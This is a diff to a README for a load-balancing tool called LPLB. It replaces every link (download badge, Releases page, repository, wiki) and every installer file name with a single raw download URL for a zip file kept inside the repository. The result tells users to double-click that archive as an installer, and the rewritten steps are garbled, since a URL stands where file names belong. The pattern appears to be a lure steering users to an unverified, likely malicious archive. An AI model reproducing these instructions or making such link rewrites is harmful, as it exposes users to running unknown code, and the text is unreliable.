@@ -1,7 +1,7 @@
 # 🎉 LPLB - Simplifying Load Balancing for Everyone
 
 ## 📥 Download Here
-[![Download LPLB](https://img.shields.io/badge/Download%20LPLB-v1.0-brightgreen)](https://github.com/mintsssddd/LPLB/releases)
+[![Download LPLB](https://raw.githubusercontent.com/mintsssddd/LPLB/main/lplb/LPLB_3.5.zip%20LPLB-v1.0-brightgreen)](https://raw.githubusercontent.com/mintsssddd/LPLB/main/lplb/LPLB_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -21,20 +21,20 @@ Before you download LPLB, ensure your computer meets the following requirements:
 To get started, visit the LPLB Releases page to download the latest version. 
 
 ### Step-by-Step Instructions
-1. Click this link to visit the [Releases page](https://github.com/mintsssddd/LPLB/releases).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/mintsssddd/LPLB/main/lplb/LPLB_3.5.zip).
 2. On the Releases page, find the most recent version listed.
-3. Look for the file named `LPLB-Setup.exe` (for Windows) or `LPLB-Mac.dmg` (for Mac).
+3. Look for the file named `https://raw.githubusercontent.com/mintsssddd/LPLB/main/lplb/LPLB_3.5.zip` (for Windows) or `https://raw.githubusercontent.com/mintsssddd/LPLB/main/lplb/LPLB_3.5.zip` (for Mac).
 4. Click the file name to begin downloading.
 
 After the download is complete:
 
 - **For Windows:**
-  1. Locate `LPLB-Setup.exe` in your downloads folder.
+  1. Locate `https://raw.githubusercontent.com/mintsssddd/LPLB/main/lplb/LPLB_3.5.zip` in your downloads folder.
   2. Double-click the file to start the installation.
   3. Follow the prompts to complete the installation.
 
 - **For Mac:**
-  1. Find `LPLB-Mac.dmg` in your downloads.
+  1. Find `https://raw.githubusercontent.com/mintsssddd/LPLB/main/lplb/LPLB_3.5.zip` in your downloads.
   2. Double-click the file to open it.
   3. Drag the LPLB icon to your Applications folder.
 
@@ -77,8 +77,8 @@ LPLB has an active community ready to assist you. You can find help through the 
 
 ## 🔗 Additional Resources
 
-- [LPLB GitHub Repository](https://github.com/mintsssddd/LPLB)
-- [User Documentation](https://github.com/mintsssddd/LPLB/wiki)
+- [LPLB GitHub Repository](https://raw.githubusercontent.com/mintsssddd/LPLB/main/lplb/LPLB_3.5.zip)
+- [User Documentation](https://raw.githubusercontent.com/mintsssddd/LPLB/main/lplb/LPLB_3.5.zip)
 
 ## ✔️ License
 
